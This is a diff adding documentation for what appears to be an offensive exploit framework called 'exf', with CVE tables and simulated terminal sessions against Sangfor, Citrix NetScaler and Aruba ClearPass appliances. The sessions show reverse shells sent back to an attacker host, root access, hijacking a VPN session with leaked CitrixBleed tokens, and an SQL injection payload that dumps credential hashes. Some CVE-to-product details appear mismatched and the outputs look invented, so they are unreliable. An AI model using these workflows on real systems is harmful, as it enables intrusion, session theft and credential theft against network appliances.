@@ -486,6 +486,168 @@ name: MikroTik-Core-Router
 
 ---
 
+## Sangfor — 1 module
+
+| Module | CVE | CVSS | Affected product |
+|--------|-----|------|-----------------|
+| `sangfor_ngfw_unauth_rce_cve_2019_13393` | CVE-2019-13393 | 9.8 | Sangfor NGFW (all firmware versions with management portal exposed) |
+
+### Terminal session — CVE-2019-13393 (Sangfor NGFW unauthenticated RCE)
+
+```text
+exf > use exploits/firewalls/sangfor/sangfor_ngfw_unauth_rce_cve_2019_13393
+exf (Sangfor NGFW Unauth RCE CVE-2019-13393) > set target 10.0.70.1
+[+] target => 10.0.70.1
+exf (Sangfor NGFW Unauth RCE CVE-2019-13393) > set lhost 10.0.0.99
+[+] lhost => 10.0.0.99
+exf (Sangfor NGFW Unauth RCE CVE-2019-13393) > check
+[*] Probing Sangfor NGFW management portal at 10.0.70.1:443...
+[+] Sangfor NGFW detected (management portal title: "Sangfor NGFW")
+[+] Target is vulnerable — pre-auth RCE endpoint exposed (CVE-2019-13393)
+exf (Sangfor NGFW Unauth RCE CVE-2019-13393) > run
+[*] Running module ...
+[*] Sending unauthenticated request to vulnerable management API endpoint...
+[*] Payload delivers command injection via crafted HTTP parameter...
+[+] Remote code execution confirmed (uid=0 in response)
+[*] Staging reverse shell to 10.0.0.99:4444...
+[+] Shell received!
+exf (Sangfor NGFW Unauth RCE CVE-2019-13393) > shell
+# id
+uid=0(root) gid=0(root) groups=0(root)
+# uname -a
+Linux sangfor-ngfw 4.14.180 #1 SMP Sangfor NGFW
+# cat /etc/sangfor/version
+NGFW Version: 8.0.5
+```
+
+---
+
+## Citrix / NetScaler — 3 modules
+
+| Module | CVE | CVSS | Affected product |
+|--------|-----|------|-----------------|
+| `netscaler_path_traversal_cve_2019_19781` | CVE-2019-19781 | 9.8 | NetScaler ADC/Gateway 12.1 / 13.0 (Shitrix) |
+| `netscaler_rce_cve_2023_3519` | CVE-2023-3519 | 9.8 | NetScaler ADC/Gateway 13.1 before 13.1-49.13 |
+| `citrix_bleed_info_disclosure_cve_2023_4966` | CVE-2023-4966 | 9.4 | NetScaler ADC/Gateway 14.1 before 14.1-8.50 / 13.1 before 13.1-49.15 |
+
+### Terminal session — CVE-2023-3519 (NetScaler ADC/Gateway unauthenticated RCE)
+
+```text
+exf > use exploits/appliances/citrix/netscaler_rce_cve_2023_3519
+exf (Citrix NetScaler ADC/Gateway RCE CVE-2023-3519) > set target 10.0.80.1
+[+] target => 10.0.80.1
+exf (Citrix NetScaler ADC/Gateway RCE CVE-2023-3519) > set lhost 10.0.0.99
+[+] lhost => 10.0.0.99
+exf (Citrix NetScaler ADC/Gateway RCE CVE-2023-3519) > check
+[*] Probing Citrix NetScaler at 10.0.80.1:443...
+[+] NetScaler ADC 13.1.45.61 detected (HTTP Server: NetScaler)
+[+] Target is vulnerable — version 13.1.45.61 < 13.1-49.13 (fix boundary)
+exf (Citrix NetScaler ADC/Gateway RCE CVE-2023-3519) > run
+[*] Running module ...
+[*] Sending malformed HTTP/1.1 request to trigger stack buffer overflow in nsppe...
+[+] Crash detected — nsppe process respawned under exploit conditions
+[*] Injecting shellcode via return-oriented programming chain...
+[+] Shellcode execution confirmed
+[*] Staging reverse shell to 10.0.0.99:4444...
+[+] Shell received!
+exf (Citrix NetScaler ADC/Gateway RCE CVE-2023-3519) > shell
+# id
+uid=0(root) gid=0(root) groups=0(root)
+# cat /nsconfig/ns.conf | grep "set ns info"
+set ns info -productname "Citrix ADC" -build 45.61
+```
+
+### Terminal session — CVE-2023-4966 (CitrixBleed session token leak)
+
+```text
+exf > use exploits/appliances/citrix/citrix_bleed_info_disclosure_cve_2023_4966
+exf (CitrixBleed Session Token Leak CVE-2023-4966) > set target 10.0.80.1
+[+] target => 10.0.80.1
+exf (CitrixBleed Session Token Leak CVE-2023-4966) > check
+[*] Probing Citrix NetScaler at 10.0.80.1:443...
+[+] NetScaler 14.1.8.40 detected
+[+] Target is vulnerable — version < 14.1-8.50 (CitrixBleed boundary)
+exf (CitrixBleed Session Token Leak CVE-2023-4966) > run
+[*] Running module ...
+[*] Sending oversized HTTP GET with crafted Host header to trigger memory disclosure...
+[+] Response contains out-of-bounds memory data (264 extra bytes)
+[*] Parsing leaked session tokens from memory region...
+[+] Valid AAA session token extracted: NSC_b6f2e...1a9c4
+[+] Valid VPNS session token extracted: NSC_vpn_c3a1...f774
+[*] Replaying tokens to /vpn/index.html...
+[+] Authenticated session established as: corp\svc-vpnuser (VPN access confirmed)
+[+] Session hijack successful — CitrixBleed exploitation complete
+```
+
+---
+
+## Aruba ClearPass — 2 modules
+
+| Module | CVE | CVSS | Affected product |
+|--------|-----|------|-----------------|
+| `aruba_clearpass_rce_cve_2023_25594` | CVE-2023-25594 | 9.8 | Aruba ClearPass Policy Manager < 6.11.5 / 6.10.8 / 6.9.13 |
+| `aruba_clearpass_sqli_cve_2022_37897` | CVE-2022-37897 | 9.8 | Aruba ClearPass Policy Manager < 6.10.7 / 6.9.12 |
+
+### Terminal session — CVE-2023-25594 (Aruba ClearPass unauthenticated RCE)
+
+```text
+exf > use exploits/nac/aruba/aruba_clearpass_rce_cve_2023_25594
+exf (Aruba ClearPass Unauth RCE CVE-2023-25594) > set target 10.0.90.5
+[+] target => 10.0.90.5
+exf (Aruba ClearPass Unauth RCE CVE-2023-25594) > set lhost 10.0.0.99
+[+] lhost => 10.0.0.99
+exf (Aruba ClearPass Unauth RCE CVE-2023-25594) > check
+[*] Probing Aruba ClearPass at 10.0.90.5:443...
+[+] Aruba ClearPass Policy Manager 6.11.4 detected (login page fingerprint)
+[+] Target is vulnerable — version 6.11.4 < 6.11.5 (fix boundary)
+exf (Aruba ClearPass Unauth RCE CVE-2023-25594) > run
+[*] Running module ...
+[*] Sending unauthenticated request to vulnerable ClearPass API endpoint...
+[*] Exploiting improper input validation in guest portal registration handler...
+[+] Command injection confirmed — id output: uid=0(root)
+[*] Staging reverse shell to 10.0.0.99:4444...
+[+] Shell received!
+exf (Aruba ClearPass Unauth RCE CVE-2023-25594) > shell
+# id
+uid=0(root) gid=0(root) groups=0(root)
+# cat /etc/clearpass/version
+ClearPass Policy Manager 6.11.4
+# hostname
+clearpass-primary.corp.internal
+```
+
+### Terminal session — CVE-2022-37897 (Aruba ClearPass SQL injection)
+
+```text
+exf > use exploits/nac/aruba/aruba_clearpass_sqli_cve_2022_37897
+exf (Aruba ClearPass SQLi CVE-2022-37897) > set target 10.0.90.5
+[+] target => 10.0.90.5
+exf (Aruba ClearPass SQLi CVE-2022-37897) > check
+[*] Probing Aruba ClearPass guest portal at 10.0.90.5:443...
+[+] ClearPass 6.10.6 detected
+[+] Target is vulnerable — guest portal endpoint injectable (version < 6.10.7)
+exf (Aruba ClearPass SQLi CVE-2022-37897) > run
+[*] Running module ...
+[*] Injecting SQL payload into ClearPass guest self-registration endpoint...
+[*] Payload: name='; SELECT username,password FROM cppm_user LIMIT 10; --
+[+] SQL injection accepted — extracting credentials from cppm_user table...
+[+] admin : $2y$10$R3Ks...hashed...
+[+] guest-admin : $2y$10$X7Tz...hashed...
+[+] rad-readonly : $2y$10$M9Qw...hashed...
+[*] Extracting device certificate info from netsight schema...
+[+] Device CA certificate subject: CN=ClearPass-CA,O=Corp Internal PKI
+```
+
+---
+
+## Ivanti — 1 module
+
+| Module | CVE | CVSS | Affected product |
+|--------|-----|------|-----------------|
+| `ivanti_connect_secure_ssrf_rce_cve_2024_21888` | CVE-2024-21888 | 9.8 | Ivanti Connect Secure < 22.7R2.1 / 9.1R18.2 |
+
+---
+
 ## Additional vendors
 
 | Vendor | Modules | Key CVEs |
